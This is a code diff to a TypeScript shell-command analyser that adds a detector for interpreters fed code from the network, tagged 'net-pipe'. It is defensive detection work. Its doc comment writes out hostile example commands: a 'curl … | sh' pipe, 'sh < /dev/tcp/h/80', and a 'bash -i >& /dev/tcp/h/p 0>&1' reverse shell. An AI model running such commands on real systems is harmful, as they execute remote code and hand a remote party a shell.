@@ -85,6 +85,17 @@ function fedByDecoder(ctx: CommandContext): boolean {
   return readsPipe(ctx) && earlierStages(ctx).some((s) => isDecoder(argvOf(s.raw)));
 }
 
+/**
+ * An interpreter reading its code from the network: stdin piped from an earlier `net`
+ * stage (`curl … | sh`, even through a decoder or `tee`), or a `/dev/tcp|udp` redirect
+ * (`sh < /dev/tcp/h/80`, `bash -i >& /dev/tcp/h/p 0>&1`). Remote code execution.
+ */
+function fedByNet(ctx: CommandContext): boolean {
+  if (ctx.c.interpreter?.stdin !== true) return false;
+  if (redirectHosts(ctx.raw.redirects).length > 0) return true;
+  return readsPipe(ctx) && earlierStages(ctx).some((s) => s.c.kind === "net");
+}
+
 function heredocExec(ctx: CommandContext, writesFile: boolean): boolean {
   if (ctx.raw.heredocs.length === 0) return false;
   if (writesFile || ctx.c.interpreter !== null) return true;
@@ -115,6 +126,7 @@ function opaqueOf(ctx: CommandContext, writesFile: boolean): OpaqueSpan[] {
     ...(ctx.c.wrapped ? (["interpreter"] as const) : []),
     ...[interpreterReason(ctx)].filter((r): r is OpaqueReason => r !== null),
     ...(heredocExec(ctx, writesFile) ? (["heredoc-exec"] as const) : []),
+    ...(fedByNet(ctx) ? (["net-pipe"] as const) : []),
     ...(ctx.c.dynamic === true ? (["dynamic-command"] as const) : []),
   ];
   return [...reasons.map((reason) => ({ reason, span })), ...carriedSpans(ctx)];
